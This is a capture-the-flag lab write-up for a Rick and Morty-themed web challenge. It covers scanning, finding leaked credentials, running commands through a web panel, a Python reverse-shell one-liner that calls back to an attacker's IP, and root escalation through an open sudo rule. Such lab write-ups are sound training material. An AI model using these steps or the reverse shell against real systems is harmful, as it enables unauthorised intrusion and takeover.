This Rick and Morty-themed challenge requires you to exploit a web server and find three ingredients to help Rick make his potion and transform himself back into a human from a pickle.

## Reconnaissance

### Nmap scan
```bash
nmap -sV -sC $TARGET                    # Where TARGET is 10.10.19.240
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-22 19:15 CEST

```

2 open ports:
- HTTP on port 80 running *Apache httpd 2.4.41 ((Ubuntu))* 
- SSH on port 22

While investigating the Web service, we can launch an enumeration using **`gobuster`**.

```bash
gobuster dir -u http://$TARGET -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -x php,html,txt
```
### CVE on Apache HTTP Server 2.4.41

> In Apache HTTP Server 2.4.0 to 2.4.41, redirects configured with mod_rewrite that were intended to be self-referential might be fooled by encoded newlines and redirect instead to an an unexpected URL within the request URL.
> *source:* https://vuldb.com/?id.152664

Not sure, it helps me to retrieve the ingredient Rick needs ON the server.
(Useful for phishing purpose)

### What the website looks like?

![Web page](assets/img/2025-06-22-THM-Pickle_Rick/web_page.png){: w="600"}
_Mission: Help Rick!_

There's a message:

```message
Help Morty!

Listen Morty... I need your help, I've turned myself into a pickle again and this time I can't change back!

I need you to *BURRRP*....Morty, logon to my computer and find the last three secret ingredients to finish my pickle-reverse potion. The only problem is, I have no idea what the *BURRRRRRRRP*, password was! Help Morty, Help!
```

And if we go under the ground ?

```html
<!DOCTYPE html>

  </div>

  <!--

    Note to self, remember username!

    Username: R1ckRul3s

  -->

</body>
</html>
```

We got an **username** `R1ckRul3s` and a repository called `assets/`.

![assets directory](assets/img/2025-06-22-THM-Pickle_Rick/assets.png){: w="600"}
_List of files in 'assets' directory_

Since there are unseen images in the `assets/` repository, may be there is a other pages where they are showed.

## Enumeration

I launched two scans in parallels.

```bash
# To catch anything
gobuster dir -u http://$TARGET -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -x php,html,txt
```

```bash
# Much more faster
gobuster dir -u http://$TARGET -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
```

I think we got something.

![enum1](assets/img/2025-06-22-THM-Pickle_Rick/enum1.png){: w="600"}
_Comprehensive enumeration_

We found a `login.php` page but we still need a password.

![login page](assets/img/2025-06-22-THM-Pickle_Rick/login.png){: w="600"}
_Login page_

I launch a much fast enumeration in parallel without the extensions and on a shorter wordlist and I found an `/robots.txt` file containing the text `Wubbalubbadubdub`.

![web page](assets/img/2025-06-22-THM-Pickle_Rick/enum2.png){: w="600"}
_Fast enumeration_

Knowing Rick I think it should be the password of an old drunk man ðŸ¤£

![robots.txt](assets/img/2025-06-22-THM-Pickle_Rick/robots.png){: w="600"}
_'robots.txt' file content_

### The portal

This is the Rick portal, it help us to execute a command on the web server.

![Command Panel](assets/img/2025-06-22-THM-Pickle_Rick/command_panel.png){: w="600"}
_Command Panel page_

The other links in the navigation bar lead to `/denied.php` page. 

![access denied](assets/img/2025-06-22-THM-Pickle_Rick/denied.png){: w="600"}
_denied.php page_

In the source code of `portal.php` we can found the following string `Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==` that looks like a base64 encoded string BUT NO.

**THIS STRING MEANS NOTHING!!!!!!!!!! ðŸ¤¬** (a kind of troll)

---

## Exploitation
### First ingredient

By running `ls -la` on the command panel, we can find a valuable information.

```bash
# Output of the command

total 40
drwxr-xr-x 3 root   root   4096 Feb 10  2019 .
drwxr-xr-x 3 root   root   4096 Feb 10  2019 ..
-rwxr-xr-x 1 ubuntu ubuntu   17 Feb 10  2019 Sup3rS3cretPickl3Ingred.txt
drwxrwxr-x 2 ubuntu ubuntu 4096 Feb 10  2019 assets
-rwxr-xr-x 1 ubuntu ubuntu   54 Feb 10  2019 clue.txt
-rwxr-xr-x 1 ubuntu ubuntu 1105 Feb 10  2019 denied.php
-rwxrwxrwx 1 ubuntu ubuntu 1062 Feb 10  2019 index.html
-rwxr-xr-x 1 ubuntu ubuntu 1438 Feb 10  2019 login.php
-rwxr-xr-x 1 ubuntu ubuntu 2044 Feb 10  2019 portal.php
-rwxr-xr-x 1 ubuntu ubuntu   17 Feb 10  2019 robots.txt
```

- and a file called **`Sup3rS3cretPickl3Ingred.txt`** on the current directory. That means it accessible from navigator.
- (I also discovered we can use `cat` "to make it hard for future PICKLEEEE RICCCKKKK" ðŸ˜‘)

So we got the first ingredient by accessing **`http://http://target_url/Sup3rS3cretPickl3Ingred.txt`**.

### Second ingredient

In order to simplify our exploration, we can set a reverse shell (my favorite part don't ask me why).

On our machine execute the command:
```bash
nc -vlnp 1234
```

On the command panel execute this one:
```bash
# Don't forget to modify by adding your IP address
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("YOUR_IP",1234));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
```

And voila! We got a shell on our terminal (we can execute cat by the way).

The second ingredient is located at **`/home/rick/second ingredient`**.
### Third ingredient

The `root` directory is not accessible, it should probably hide the 3rd ingredient.

```bash
www-data@ip-10-10-19-240:/home/rick$ ls /root
ls /root
ls: cannot open directory '/root': Permission denied
```

So let's check our privileges:
```bash
www-data@ip-10-10-19-240:/home/rick$ sudo -l
sudo -l
Matching Defaults entries for www-data on ip-10-10-19-240:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-10-19-240:
    (ALL) NOPASSWD: ALL
```

**" `(ALL) NOPASSWD: ALL` "**

![Really???](https://media3.giphy.com/media/v1.Y2lkPTc5MGI3NjExMXN0YXhlMGp1a2wybGdnbnNkb2RkOHZhbmloYnR2OXFyc21oeTF1eCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/oOTTyHRHj0HYY/giphy.gif){: w="500"}

We can higher our privileges by executing **`sudo bash`** and find the 3rd ingredient at **`/root/3rd.txt`**.

All flags down, mission passed.

Be proud of what youâ€™ve accomplished.
